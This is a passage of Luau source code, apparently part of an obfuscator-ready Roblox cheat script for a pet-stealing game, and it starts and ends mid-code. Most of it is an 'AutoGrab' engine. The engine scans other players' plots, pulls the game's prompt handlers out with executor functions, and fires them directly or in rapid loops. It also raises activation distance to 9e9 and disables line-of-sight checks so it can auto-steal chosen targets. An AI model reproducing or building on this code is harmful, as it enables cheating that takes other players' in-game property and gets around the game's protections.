    indicator.Position               = UDim2.new(0.5, 0, 1, -6)
    indicator.Size                   = UDim2.new(1, -18, 0, 20)
    indicator.BackgroundColor3       = T.Card
    indicator.BackgroundTransparency = 0.05
    indicator.AutoButtonColor        = false
    indicator.Text                   = ""
    indicator.BorderSizePixel        = 0
    indicator.Visible                = false
    indicator.ZIndex                 = 60
    indicator.Parent                 = priorityPanel.panel
    Corner(indicator, 10)
    GradStroke(indicator, 1.4, 1, 0)
    local indArrow = Lbl(indicator, "▼", 11, T.Accent or T.White, Enum.Font.FredokaOne)
    indArrow.Size           = UDim2.new(0, 16, 1, 0)
    indArrow.Position       = UDim2.new(0, 8, 0, 0)
    indArrow.TextXAlignment = Enum.TextXAlignment.Center
    indArrow.ZIndex         = 61
    local indName = Lbl(indicator, "", 10, T.Text, Enum.Font.FredokaOne)
    indName.Size            = UDim2.new(1, -34, 1, 0)
    indName.Position        = UDim2.new(0, 28, 0, 0)
    indName.TextTruncate    = Enum.TextTruncate.AtEnd
    indName.ZIndex          = 61
    local selectedOffscreen; selectedOffscreen = LPH_NO_VIRTUALIZE(function()
        local sig = next(AutoGrab.priority)
        local row = sig and rows[sig]
        if not (row and row.card and row.card.Parent) then return nil end
        local top  = row.card.AbsolutePosition.Y
        local bot  = top + row.card.AbsoluteSize.Y
        local vTop = scroll.AbsolutePosition.Y
        local vBot = vTop + scroll.AbsoluteWindowSize.Y
        if bot < vTop + 4 then return row, "up" end
        if top > vBot - 4 then return row, "down" end
        return nil
    end)
    local _indPulse = 0
    local _indAccumulator = 0
    RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(dt)
        if not priorityPanel.panel.Visible then indicator.Visible = false return end
        _indAccumulator = _indAccumulator + dt
        if _indAccumulator < 0.1 then return end
        dt = _indAccumulator
        _indAccumulator = 0
        local row, dir = selectedOffscreen()
        if not row then indicator.Visible = false return end
        indicator.Visible = true
        indArrow.Text = (dir == "down") and "▼" or "▲"
        indArrow.Rotation = 0
        indName.Text = row.name or ""
        _indPulse = _indPulse + dt * 5
        indArrow.TextTransparency = 0.15 + 0.2 * (0.5 + 0.5 * math.sin(_indPulse))
    end))
    indicator.Activated:Connect(LPH_NO_VIRTUALIZE(function()
        local sig = next(AutoGrab.priority)
        local row = sig and rows[sig]
        if not (row and row.card and row.card.Parent) then return end
        local y = row.card.AbsolutePosition.Y - scroll.AbsolutePosition.Y + scroll.CanvasPosition.Y
        local maxY = math.max(0, scroll.AbsoluteCanvasSize.Y - scroll.AbsoluteWindowSize.Y)
        Tween(scroll, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { CanvasPosition = Vector2.new(0, math.clamp(y - 8, 0, maxY)) })
    end))
    task.spawn(LPH_NO_VIRTUALIZE(function()
        while true do
            local vis = priorityPanel.panel.Visible
            _G._FH_GammaNeedList = vis
            if vis then
                local present = {}
                for i, rec in ipairs(AutoGrab.animalList or {}) do
                    local sig = recSig(rec)
                    present[sig] = true
                    if not rows[sig] then makeCard(rec); task.wait() end
                    local r = rows[sig]
                    if r and r.card then
                        if r.update then r.update(rec) end
                        local rar = string.lower(tostring(rec.rarity or ""))
                        local grp = 2
                        if rar:find("secret", 1, true) then grp = 1 end
                        if rar:find("og", 1, true) and not rar:find("god", 1, true) then grp = 0 end
                        local panelPriority = {
                            ["headless horseman"] = 1,
                            ["strawberry elephant"] = 2,
                            ["meowl"] = 3,
                            ["skibidi toilet"] = 4,
                            ["john pork"] = 5,
                        }
                        local priorityName = string.lower(tostring(rec.name or rec.displayName or rec.modelName or ""))
                        local priorityRank = panelPriority[priorityName]
                        r.card.LayoutOrder = priorityRank and (-10000 + priorityRank) or (grp * 10000 + i)
                    end
                end
                for sig, r in pairs(rows) do
                    if not present[sig] then r.card:Destroy(); rows[sig] = nil
                    else r.paint() end
                end
                if applyFilter then applyFilter() end
                task.wait(0.3)
            else
                task.wait(1)
            end
        end
    end))
end
-- Neptune Auto Grab Nearest / Auto Steal Priority engine.
AutoGrab = (function()
    local M = { nearest = false, best = false, priorityGrab = false, fast = false, fastGrab = false, _oneShot = false, progress = 0, hasTarget = false, priority = {}, currentTargetSig = nil }

    do
        local _savedPrioritySet = Config.get("priority_set", nil)
        if type(_savedPrioritySet) == "table" then
            for k, v in pairs(_savedPrioritySet) do
                if v then M.priority[k] = true end
            end
        end
    end
    M.setFast = function(v)  M.fast = v and true or false end
    M.setFastGrab = function(v)  M.fastGrab = v and true or false; if not M.fastGrab then M._fastHoldStart = nil end end
    M.setNearest = function(v)       M.nearest      = v and true or false end
    M.setBest = function(v)          M.best         = v and true or false end
    M.setPriorityGrab = function(v)  M.priorityGrab = v and true or false end
    M.togglePriority = function(name) 
        if M.priority[name] then M.priority[name] = nil else M.priority[name] = true end
        pcall(function()  Config.set("priority_set", M.priority) end)
        return M.priority[name] == true
    end
    M.isPriority = function(name)  return M.priority[name] == true end
    M.hasPriority = function()     return next(M.priority) ~= nil end
    M.animalList = {}
    task.spawn(function()
        local ok, err = pcall(function()
            local cloneref  = cloneref or function(o)  return o end
            local Players   = cloneref(game:GetService("Players"))
            local Workspace = cloneref(game:GetService("Workspace"))
            local player    = Players.LocalPlayer or Players.PlayerAdded:Wait()
            local isMyPlot; isMyPlot = function(plot) 
                if not plot or not plot:IsA("Model") then return false end
                local sign = plot:FindFirstChild("PlotSign")
                return sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled
            end
            local _scIsJunk; _scIsJunk = function(s) 
                if not s or s == "" or #s < 3 then return true end
                if s == "Model" then return true end
                if s:match("^%d+$") then return true end
                if s:match("^%d+%.%d") then return true end
                if not s:match("%a") then return true end
                if s:lower():find("podium") then return true end
                if s:match("^%x%x%x%x%x%x%x%x%-%x+%-%x+%-%x+%-%x+$") then return true end
                if #s > 20 and s:match("^[%x%-]+$") then return true end
                return false
            end
            local _agModelCache = {}
            local scanAllPlots; scanAllPlots = function() 
                local result = {}
                local _scanYield = 0
                local plots = Workspace:FindFirstChild("Plots")
                if not plots then return result end
                for _, plot in ipairs(plots:GetChildren()) do
                    if not isMyPlot(plot) then
                        pcall(function() 
                            local pods = plot:FindFirstChild("AnimalPodiums")
                            if not pods then return end
                            for _, podium in ipairs(pods:GetChildren()) do
                                _scanYield = _scanYield + 1
                                if _scanYield % 8 == 0 then task.wait() end
                                if podium:IsA("Model") or podium:IsA("Folder") then
                                    pcall(function() 
                                        local base = podium:FindFirstChild("Base")
                                        local spawnPart = base and base:FindFirstChild("Spawn")
                                        if not spawnPart then return end
                                        local prompt
                                        for _, obj in ipairs(_FH_GetDesc(spawnPart)) do
                                            if obj:IsA("ProximityPrompt") and obj.ObjectText and obj.ObjectText ~= "" then
                                                prompt = obj
                                                break
                                            end
                                        end
                                        if not prompt then
                                            local direct = spawnPart:FindFirstChildOfClass("ProximityPrompt")
                                            if direct and direct.ObjectText and direct.ObjectText ~= "" then prompt = direct end
                                        end
                                        if not prompt then return end
                                        local petName = prompt.ObjectText or ""
                                        if _scIsJunk(petName) then return end
                                        local holder = prompt.Parent
                                        local pos
                                        if holder and holder:IsA("Attachment") then
                                            pos = holder.WorldPosition
                                        elseif holder and holder:IsA("BasePart") then
                                            pos = holder.Position
                                        elseif spawnPart:IsA("BasePart") then
                                            pos = spawnPart.Position
                                        else
                                            local part = spawnPart:FindFirstChildWhichIsA("BasePart", true)
                                                or base:FindFirstChildWhichIsA("BasePart", true)
                                            pos = part and part.Position or nil
                                        end
                                        if not pos then return end
                                        local podNum = tonumber(podium.Name:match("%d+"))
                                        local podKey = podNum or podium.Name
                                        local modelInst
                                        do

                                            local _mKey = tostring(plot.Name or "") .. "::" .. tostring(podKey or 0) .. "::" .. tostring(petName or "")
                                            local _mc = _agModelCache[_mKey]
                                            if _mc and _mc.model and _mc.model.Parent and (os.clock() - _mc.t) < 6 then
                                                modelInst = _mc.model
                                            else
                                                local lower = string.lower(petName)
                                                local matchModel; matchModel = function(root) 
                                                    for _, ch in ipairs(_FH_GetDesc(root)) do
                                                        if ch:IsA("Model") and ch ~= podium then
                                                            local cln = string.lower(ch.Name)
                                                            if ch.Name == petName or cln == lower
                                                                or cln:find(lower, 1, true)
                                                                or lower:find(cln, 1, true) then
                                                                return ch
                                                            end
                                                        end
                                                    end
                                                    return nil
                                                end

                                                if pos then
                                                    local bestModel, bestDist = nil, math.huge
                                                    local _agScanClock = os.clock()
                                                    for _, ch in ipairs(plot:GetChildren()) do
                                                        if ch:IsA("Model") then
                                                            local ref = ch.PrimaryPart
                                                                or ch:FindFirstChildWhichIsA("BasePart", true)
                                                            if ref then
                                                                local d = (ref.Position - pos).Magnitude
                                                                if d < bestDist then
                                                                    bestDist = d
                                                                    bestModel = ch
                                                                end
                                                            end
                                                        end
                                                        if os.clock() - _agScanClock > 0.0008 then
                                                            task.wait()
                                                            _agScanClock = os.clock()
                                                        end
                                                    end
                                                    modelInst = bestModel
                                                else
                                                    modelInst = matchModel(plot)
                                                end
                                                if modelInst then
                                                    _agModelCache[_mKey] = { model = modelInst, t = os.clock() }
                                                end
                                            end
                                        end
                                        local _agGenVal, _agMut, _agTr = 0, nil, nil
                                        pcall(function()
                                            local _fetchFn = _G._FH_FetchPlotData or _G._FH_PlotData
                                            local _agSh    = _G._FH_AnimalsShared
                                            if _fetchFn then
                                                local _cache = _fetchFn(plot.Name)
                                                local _al    = _cache and _cache.AnimalList
                                                if typeof(_al) == "table" then
                                                    local _resolve = _G._FH_ResolveEntry
                                                    local _d
                                                    if _resolve then
                                                        _d = _resolve(_al, podium.Name, petName)
                                                    else
                                                        _d = _al[tostring(podium.Name)]
                                                        if typeof(_d) ~= "table" and podNum then
                                                            _d = _al[podNum] or _al[tostring(podNum)]
                                                        end
                                                        if typeof(_d) ~= "table" then
                                                            local _wantL = tostring(petName or ""):lower()
                                                            for _, _e in next, _al do
                                                                if typeof(_e) == "table" and _e.Index ~= nil
                                                                   and tostring(_e.Index):lower() == _wantL then
                                                                    _d = _e; break
                                                                end
                                                            end
                                                        end
                                                    end
                                                    if typeof(_d) == "table" and _d.Index then
                                                        _agMut    = _d.Mutation
                                                        _agTr     = _d.Traits
                                                        if _agSh then
                                                            _agGenVal = _agSh:GetGeneration(_d.Index, _d.Mutation, _d.Traits, nil) or 0
                                                        end
                                                    end
                                                end
                                            end
                                        end)
                                        table.insert(result, {
                                            plotName    = plot.Name,
                                            pod         = podKey,
                                            sig         = tostring(plot.Name or "") .. "::" .. tostring(podKey or 0) .. "::" .. tostring(petName or ""),
                                            pos         = pos,
                                            prompt      = prompt,
                                            genValue    = _agGenVal,
                                            displayName = petName,
                                            modelName   = petName,
                                            modelInst   = modelInst,
                                            mutation    = _agMut,
                                            traits      = _agTr,
                                            plot        = plot,
                                        })
                                    end)
                                end
                            end
                        end)
                    end
                end
                return result
            end
            local CachedBrainrots = {}
            local _agScanBusy = false
            task.spawn(function() 
                while true do
                    local need = M.nearest or M.best or M.priorityGrab or M.fastGrab or M._oneShot or (_G._FH_GammaNeedList == true) or (_G._FH_ESPNeedList == true)
                    if not need then
                        task.wait(0.25)
                    else
                        if not _agScanBusy then
                            _agScanBusy = true
                            task.spawn(function()
                                pcall(function()
                                    local fresh = scanAllPlots()
                                    CachedBrainrots = fresh
                                    do
                                        local _needRebind = false
                                        if next(M.priority) == nil then
                                            _needRebind = _FH_SavedPriorityName ~= nil
                                        else
                                            local _lockedSig = next(M.priority)
                                            local _stillValid = false
                                            for _, _rbr in ipairs(fresh) do
                                                if _rbr.sig == _lockedSig then _stillValid = true; break end
                                            end
                                            _needRebind = not _stillValid and _FH_SavedPriorityName ~= nil
                                        end
                                        if _needRebind then
                                            for k in pairs(M.priority) do M.priority[k] = nil end
                                            local wanted = tostring(_FH_SavedPriorityName):lower()
                                            for _, savedBr in ipairs(fresh) do
                                                local currentName = tostring(savedBr.displayName or savedBr.modelName or ""):lower()
                                                if currentName == wanted then
                                                    M.priority[savedBr.sig] = true
                                                    Config.set("priority_set", M.priority)
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    local list = {}
                                    for _, br in ipairs(fresh) do
                                        list[#list + 1] = {
                                            name     = br.displayName, modelName = br.modelName,
                                            modelInst = br.modelInst,
                                            mutation = br.mutation,    traits    = br.traits,
                                            genValue = br.genValue,    plotName  = br.plotName,
                                            pod      = br.pod,         plot      = br.plot,
                                        }
                                    end
                                    M.animalList = list
                                end)
                                _agScanBusy = false
                            end)
                        end
                        local activelyGrabbing = M.nearest or M.best or M.priorityGrab or M.fastGrab or M._oneShot
                        task.wait(activelyGrabbing and 0.15 or 0.75)
                    end
                end
            end)
            local getNearest; getNearest = function() 
                local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if not hrp then return nil end
                local best, bestDist = nil, math.huge
                for _, br in ipairs(CachedBrainrots) do
                    local d = (br.pos - hrp.Position).Magnitude
                    if d < bestDist then bestDist = d; best = br end
                end
                return best
            end
            local getBest; getBest = function() 
                return CachedBrainrots[1]
            end
            local getPriorityTarget; getPriorityTarget = function() 
                local lockedSig = next(M.priority)
                if not lockedSig then
                    return nil
                end
                for _, br in ipairs(CachedBrainrots) do
                    if br.sig == lockedSig then return br end
                end
                return nil
            end
            local isActive; isActive = function()  return M.nearest or M.best or M.priorityGrab or M.fastGrab or M._oneShot end
            local _harvestCache = {}
            local harvest; harvest = function(prompt) 
                if _harvestCache[prompt] then
                    return _harvestCache[prompt].hold, _harvestCache[prompt].trigger, _harvestCache[prompt].holdEnd
                end
                local hold, trigger, holdEnd = {}, {}, {}
                if type(getconnections) ~= "function" then return hold, trigger, holdEnd end
                local function _gc(sig, tbl)
                    local ok, conns = pcall(getconnections, sig)
                    if ok and type(conns) == "table" then
                        for _, c in ipairs(conns) do if type(c.Function) == "function" then table.insert(tbl, c.Function) end end
                    end
                end
                _gc(prompt.PromptButtonHoldBegan, hold)
                _gc(prompt.Triggered, trigger)
                _gc(prompt.PromptButtonHoldEnded, holdEnd)
                if #hold > 0 or #trigger > 0 or #holdEnd > 0 then
                    _harvestCache[prompt] = { hold = hold, trigger = trigger, holdEnd = holdEnd }
                end
                return hold, trigger, holdEnd
            end
            local MIN_HOLD  = 1.3
            -- Match Neptune's actual steal sequence: begin the steal hold,
            -- activate Giant Potion while the hold is already running, then
            -- finish the remaining hold time and trigger the steal.
            -- The potion is NOT scheduled from an arbitrary fixed offset; it
            -- fires from the exact point the target is confirmed in range.
            local NEPTUNE_TRIGGER_PAD = 0.02
            local WAIT_STOP = MIN_HOLD + 1.3
            M.waitUntil = 0
            local grabActive = {}
            local _potNextOk = 0
            local shouldPopPotion; shouldPopPotion = function(prompt) 
                if not (AutoBigPotion and AutoBigPotion.activate and AutoBigPotion.enabled) then return false end
                if not prompt or not prompt.Parent then return false end
                if prompt.ActionText ~= "Steal" then return false end
                if AutoBigPotion.isGiant and AutoBigPotion.isGiant() then return false end
                if not (M.nearest or M.priorityGrab) and not isInEnemyPlot() then return false end
                if AutoBigPotion.isActivating and AutoBigPotion.isActivating() then return false end
                local char = player.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local part = prompt.Parent
                local pos = part:IsA("Attachment") and part.WorldPosition
                    or (part:IsA("BasePart") and part.Position)
                if not hrp or not pos or (hrp.Position - pos).Magnitude > 10 then return false end
                return true
            end
            local _fastLastFire = {}
            local fireFastSteal; fireFastSteal = function(prompt, sig) 
                if not prompt or not prompt.Parent then return false end
                if not prompt.Enabled then return false end
                if type(fireproximityprompt) ~= "function" then return false end
                local _now = os.clock()
                if _fastLastFire[prompt] and (_now - _fastLastFire[prompt]) < 0.08 then
                    return false
                end
                _fastLastFire[prompt] = _now
                M.hasTarget = true
                M.progress  = 1
                if shouldPopPotion(prompt) then
                    task.spawn(function() pcall(AutoBigPotion.activate) end)
                end
                for i = 1, 25 do
                    if not prompt.Parent then break end
                    pcall(fireproximityprompt, prompt, 0)
                end
                M.progress  = 0
                M.hasTarget = false
                return true
            end
            local function firePatchedSteal(prompt, nearestSig)
                if not prompt or not prompt.Parent then return false end
                if M.fast then
                    local sig = prompt
                    local pod = prompt.Parent and prompt.Parent.Parent and prompt.Parent.Parent.Parent
                    if pod then sig = pod end
                    return fireFastSteal(prompt, sig)
                end
                if M.fastGrab then
                    if grabActive[prompt] then return false end
                    grabActive[prompt] = true
                    local hold, trigger, holdEnd = harvest(prompt)
                    if #hold == 0 and #trigger == 0 then
                        grabActive[prompt] = nil
                        if type(fireproximityprompt) == "function" then pcall(fireproximityprompt, prompt) end
                        return false
                    end
                    local origDist = prompt.MaxActivationDistance
                    pcall(function()  prompt.MaxActivationDistance = 9e9 end)
                    pcall(function()  prompt.RequiresLineOfSight = false end)
                    for _, fn in ipairs(hold) do task.spawn(fn) end
                    M._fastHoldStart = tick()
                    M.progress = 0.5
                    local potionFired = false
                    if shouldPopPotion(prompt) then
                        potionFired = pcall(AutoBigPotion.activate)
                    end
                    while tick() - M._fastHoldStart < MIN_HOLD do
                        if not M.fastGrab or not prompt.Parent then break end
                        local held = tick() - M._fastHoldStart
                        M.progress = math.clamp(held / MIN_HOLD, 0, 1)
                        RunService.RenderStepped:Wait()
                    end
                    if not M.fastGrab or not prompt or not prompt.Parent then
                        pcall(function()  prompt.MaxActivationDistance = origDist end)
                        grabActive[prompt] = nil
                        M._fastHoldStart = nil
                        M.progress = 0
                        return false
                    end
                    M.progress = 1
                    local fired = false
                    if #trigger > 0 then
                        task.wait(NEPTUNE_TRIGGER_PAD)
                        for _, fn in ipairs(trigger) do task.spawn(fn) end
                        fired = true
                    elseif type(fireproximityprompt) == "function" then
                        pcall(fireproximityprompt, prompt)
                        fired = true
                    end
                    for _, fn in ipairs(holdEnd) do task.spawn(fn) end
                    pcall(function()  prompt.MaxActivationDistance = origDist end)
                    grabActive[prompt] = nil
                    M._fastHoldStart = nil
                    M.progress   = 0
                    M.waitUntil  = 0
                    return fired
                end
                if grabActive[prompt] then return false end
                grabActive[prompt] = true
                local hold, trigger = harvest(prompt)
                if #hold == 0 and #trigger == 0 then
                    grabActive[prompt] = nil
                    if type(fireproximityprompt) == "function" then pcall(fireproximityprompt, prompt) end
                    return false
                end
                local origDist = prompt.MaxActivationDistance
                pcall(function()  prompt.MaxActivationDistance = 9e9 end)
                pcall(function()  prompt.RequiresLineOfSight = false end)
                for _, fn in ipairs(hold) do task.spawn(fn) end
                local startedAt = tick()
                local potionFired = false

                -- Neptune starts the prompt hold first, then activates the
                -- Giant Potion once the target is actually reached. Since this
                -- engine only enters this function after reaching the target,
                -- do the same thing here immediately: potion -> remaining hold
                -- time -> 0.02s trigger pad.
                if (M.nearest or M.priorityGrab) and shouldPopPotion(prompt) then
                    potionFired = pcall(AutoBigPotion.activate)
                end

                while tick() - startedAt < MIN_HOLD do
                    if not isActive() then break end
                    if nearestSig then
                        local ns
                        if M.priorityGrab then
                            local pt = getPriorityTarget()
                            ns = pt and pt.sig
                        else
                            local nn = getNearest()
                            ns = nn and nn.sig
                        end
                        if ns ~= nearestSig then
                            pcall(function()  prompt.MaxActivationDistance = origDist end)
                            grabActive[prompt] = nil
                            M.progress = 0
                            return false
                        end
                    end
                    local held = tick() - startedAt
                    M.progress = math.clamp(held / MIN_HOLD, 0, 1)
                    RunService.RenderStepped:Wait()
                end
                M.progress = 1
                local dist; dist = function() 
                    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                    if not hrp or not prompt.Parent then return math.huge end
                    local pp  = prompt.Parent
                    local pos = pp:IsA("Attachment") and pp.WorldPosition or (pp:IsA("BasePart") and pp.Position) or nil
                    if not pos then return math.huge end
                    return (hrp.Position - pos).Magnitude
                end
                local alreadyInRange = dist() <= 10
                local fired = false
                M.waitUntil = startedAt + WAIT_STOP
                while isActive() do
                    local elapsed = tick() - startedAt
                    if elapsed > WAIT_STOP then break end
                    if not prompt.Parent then break end
                    if nearestSig then
                        local ns
                        if M.priorityGrab then
                            local pt = getPriorityTarget()
                            ns = pt and pt.sig
                        else
                            local nn = getNearest()
                            ns = nn and nn.sig
                        end
                        if ns ~= nearestSig then
                            pcall(function()  prompt.MaxActivationDistance = origDist end)
                            grabActive[prompt] = nil
                            M.waitUntil = 0
                            M.progress  = 0
                            return false
                        end
                    end
                    if dist() <= 10 then
                        if not alreadyInRange and not M.fast and not M.fastGrab then task.wait(0.3) end
                        if prompt.Parent and #trigger > 0 then
                            task.wait(NEPTUNE_TRIGGER_PAD)
                            for _, fn in ipairs(trigger) do task.spawn(fn) end
                            fired = true
                        end
                        break
                    end
                    RunService.RenderStepped:Wait()
                end
                M.waitUntil = 0
                if prompt and prompt.Parent then
                    pcall(function()  prompt.MaxActivationDistance = origDist end)
                end
                grabActive[prompt] = nil
                M.progress = 0
                return fired
            end
            M.findBySig = function(sig) 
                for _, br in ipairs(CachedBrainrots) do
                    local s = br.sig
                    if s == sig then return br end
                end
                return nil
            end
            M.posOfSig = function(sig) 
                local br = M.findBySig(sig)
                return br and br.pos or nil
            end
            function M.stealSigOnce(sig)
                local br = M.findBySig(sig)
                if not (br and br.prompt and br.prompt.Parent) then return false end
                local prompt = br.prompt
                if grabActive[prompt] then return false end
                grabActive[prompt] = true
                local origDist = prompt.MaxActivationDistance
                pcall(function()  prompt.MaxActivationDistance = 9e9 end)
                pcall(function()  prompt.RequiresLineOfSight   = false end)
                local hold, trigger = harvest(prompt)
                if BackpackLock and BackpackLock.suspend then pcall(function()  BackpackLock.suspend(MIN_HOLD + 8) end) end
                for _, fn in ipairs(hold) do task.spawn(fn) end
                task.wait(MIN_HOLD)
                local dist; dist = function() 
                    local c = player.Character
                    local h = c and c:FindFirstChild("HumanoidRootPart")
                    if not h or not prompt.Parent then return math.huge end
                    local pp  = prompt.Parent
                    local pos = pp:IsA("Attachment") and pp.WorldPosition
                        or (pp:IsA("BasePart") and pp.Position) or nil
                    if not pos then return math.huge end
                    return (h.Position - pos).Magnitude
                end
                local fired, t0 = false, os.clock()
                while os.clock() - t0 < 8 do
                    if not prompt.Parent then break end
                    if dist() <= 12 then
                        if #trigger > 0 then
                            for _, fn in ipairs(trigger) do task.spawn(fn) end
                        elseif type(fireproximityprompt) == "function" then
                            pcall(fireproximityprompt, prompt)
                        end
                        fired = true
                        break
                    end
                    task.wait()
                end
                if prompt and prompt.Parent then
                    pcall(function()  prompt.MaxActivationDistance = origDist end)
                end
                grabActive[prompt] = nil
                return fired
            end
            M.MIN_HOLD = MIN_HOLD
            local loop; loop = function() 
                while isActive() do
                    local target
                    if M.priorityGrab then target = getPriorityTarget()
                    elseif M.best then target = getBest()
                    else                                        target = getNearest() end
                    local prompt = target and target.prompt
                    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                    if prompt and prompt.Parent and hrp then
                        local pp = prompt.Parent
                        local promptPos = (pp:IsA("Attachment") and pp.WorldPosition)
                            or (pp:IsA("BasePart") and pp.Position) or target.pos
                        local dist = promptPos and (hrp.Position - promptPos).Magnitude or math.huge
                        if false then
                            M.hasTarget = false
                            M.progress  = 0
                            task.wait(0.05)
                        else
                            M.hasTarget  = true
                            M.targetName = target.displayName or "Brainrot"
                            M.targetGen  = target.genValue or 0
                            M.targetModel  = target.modelName
                            M.targetInst   = target.modelInst
                            M.targetPlot   = target.plot
                            M.targetMut    = target.mutation
                            M.targetTraits = target.traits
                            M.targetPodium = (prompt and prompt:FindFirstAncestorWhichIsA("Model")) or target.modelInst
                            M.targetPrompt = prompt  -- expose so external code can walk to the exact prompt position
                            M.currentTargetSig = target.sig
                            local _nearSig = (M.nearest or M.fastGrab or M.priorityGrab) and M.currentTargetSig or nil
                            _G._FH_AutoGrabBusy = true
                            if CarpetSpeed and CarpetSpeed.setGrabSuspended then
                                pcall(CarpetSpeed.setGrabSuspended, true)
                            end
                            if BackpackLock and BackpackLock.suspend then
                                pcall(BackpackLock.suspend, MIN_HOLD + 3)
                            end
                            local _grabOk, _grabResult = pcall(firePatchedSteal, prompt, _nearSig)
                            if CarpetSpeed and CarpetSpeed.setGrabSuspended then
                                pcall(CarpetSpeed.setGrabSuspended, false)
                            end
                            _G._FH_AutoGrabBusy = false
                            if not _grabOk then   end
                            RunService.Heartbeat:Wait()
                        end
                    else
                        M.hasTarget = false
                        M.progress  = 0
                        M.currentTargetSig = nil
                        M.targetPodium = nil
                        M.targetPrompt = nil
                        task.wait(0.05)
                    end
                end
                M.progress  = 0
                M.hasTarget = false
                M.currentTargetSig = nil
                M.targetPodium = nil
                M.targetPrompt = nil
                M.waitUntil = 0
                M._fastHoldStart = nil
                _G._FH_AutoGrabBusy = false
                if CarpetSpeed and CarpetSpeed.setGrabSuspended then
                    pcall(CarpetSpeed.setGrabSuspended, false)
                end
            end
            while true do
                if isActive() then loop() end
                task.wait(0.2)
            end
        end)
    end)
    _G._FH_AutoGrab = M
    return M
end)()
_G._FH_AutoGrab = AutoGrab
do
    local bar = Instance.new("Frame")
    bar.Name                   = "AutoGrabBar"
    bar.Size                   = UDim2.new(0, 210, 0, 44)
    bar.Position               = UDim2.new(0.5, -105, 0.5, -22)
    bar.BackgroundColor3       = Color3.fromRGB(13, 13, 17)
    bar.BackgroundTransparency = 0.07
    bar.BorderSizePixel        = 0
    bar.Active                 = true
    bar.Visible                = false
    bar.ZIndex                 = 60
    bar.Parent                 = GUI
    _newScale(bar)
    trackBgFrame(bar, "Bg")
    do
        local pp = Config.get("panelpos:AutoGrabBar", nil)
        if type(pp) == "table" and #pp == 4 then
            bar.Position = UDim2.new(pp[1], pp[2], pp[3], pp[4])
        end
    end
    _FH_RegisterPanel("panelpos:AutoGrabBar", LPH_NO_VIRTUALIZE(function(pp)
        if type(pp) == "table" and #pp == 4 then
            bar.Position = UDim2.new(pp[1], pp[2], pp[3], pp[4])
        end
    end))
    local _grabClampOnScreen; _grabClampOnScreen = LPH_NO_VIRTUALIZE(function()
        local vp = GUI.AbsoluteSize
        if vp.X < 1 or vp.Y < 1 then return end
        local abs = bar.AbsolutePosition
        local sz  = bar.AbsoluteSize
        local nx  = math.clamp(abs.X, 0, math.max(0, vp.X - sz.X))
        local ny  = math.clamp(abs.Y, 0, math.max(0, vp.Y - sz.Y))
        if math.abs(nx - abs.X) > 0.5 or math.abs(ny - abs.Y) > 0.5 then
            bar.Position = UDim2.new(0, nx, 0, ny)
        end
    end)
    bar:GetPropertyChangedSignal("Visible"):Connect(LPH_NO_VIRTUALIZE(function()
        if bar.Visible then task.defer(_grabClampOnScreen) end
    end))
    Corner(bar, 14)
    GradStroke(bar, 2, 0, 135)
    local Shadow = Instance.new("ImageLabel")
    Shadow.Size                   = UDim2.new(1, 30, 1, 30)
    Shadow.Position               = UDim2.new(0, -15, 0, -15)
    Shadow.BackgroundTransparency = 1
    Shadow.Image                  = "rbxassetid://5028857084"
    Shadow.ImageColor3            = Color3.fromRGB(0, 0, 0)
    Shadow.ImageTransparency      = 0.55
    Shadow.ScaleType              = Enum.ScaleType.Slice
    Shadow.SliceCenter            = Rect.new(24, 24, 276, 276)
    Shadow.ZIndex                 = 59
    Shadow.Parent                 = bar
    local dot = Instance.new("Frame")
    dot.Size             = UDim2.new(0, 6, 0, 6)
    dot.Position         = UDim2.new(0, 12, 0, 11)
    dot.BackgroundColor3 = T.White
    dot.BorderSizePixel  = 0
    dot.ZIndex           = 61
    dot.Parent           = bar
    Corner(dot, 3)
    Grad(dot, nil, nil, 0)
    local title = Lbl(bar, "AUTO GRAB", 11, T.Text, Enum.Font.FredokaOne)
    title.Size     = UDim2.new(0, 66, 0, 14)
    title.Position = UDim2.new(0, 24, 0, 7)
    title.ZIndex   = 61
    local nameMid = Lbl(bar, "", 11, T.White, Enum.Font.FredokaOne)
    nameMid.Size           = UDim2.new(1, -116, 0, 14)
    nameMid.Position       = UDim2.new(0, 92, 0, 7)
    nameMid.TextTruncate   = Enum.TextTruncate.AtEnd
    nameMid.ZIndex         = 61
    local pct = Lbl(bar, "0%", 11, T.TextDim, Enum.Font.FredokaOne, Enum.TextXAlignment.Right)
    pct.Size     = UDim2.new(0, 80, 0, 14)
    pct.Position = UDim2.new(1, -92, 0, 7)
    pct.ZIndex   = 61
    local track = Instance.new("Frame")
    track.Size             = UDim2.new(1, -24, 0, 13)
    track.Position         = UDim2.new(0, 12, 1, -19)
    track.BackgroundColor3 = T.Soft
    track.BackgroundTransparency = 0.2
    track.BorderSizePixel  = 0
    track.ClipsDescendants = true
    track.ZIndex           = 61
    track.Parent           = bar
    trackBgFrame(track, "Soft")
    Corner(track, 6)
    local GRAB_RED   = Color3.fromRGB(240, 60, 60)
    local GRAB_GREEN = Color3.fromRGB(40, 200, 90)
    local fill = Instance.new("Frame")
    fill.Size             = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = GRAB_RED
    fill.BorderSizePixel  = 0
    fill.ZIndex           = 62
    fill.Parent           = track
    Corner(fill, 6)
    local fillGrad = Grad(fill, nil, nil, 0)
    fillGrad.Enabled = false
    local pctMid = Lbl(bar, "0%", 9, T.White, Enum.Font.FredokaOne, Enum.TextXAlignment.Center)
    pctMid.Size             = UDim2.new(1, -24, 0, 13)
    pctMid.Position         = UDim2.new(0, 12, 1, -19)
    pctMid.TextYAlignment   = Enum.TextYAlignment.Center
    pctMid.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    pctMid.TextStrokeTransparency = 0.55
    pctMid.ZIndex           = 63
    do
        local dragging, ds, ws, moved
        bar.InputBegan:Connect(LPH_NO_VIRTUALIZE(function(inp)
            if IsGlobalGuiLocked() then return end
            if inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch then
                dragging = true; ds = inp.Position; ws = bar.Position; moved = false
            end
        end))
        bar.InputEnded:Connect(LPH_NO_VIRTUALIZE(function(inp)
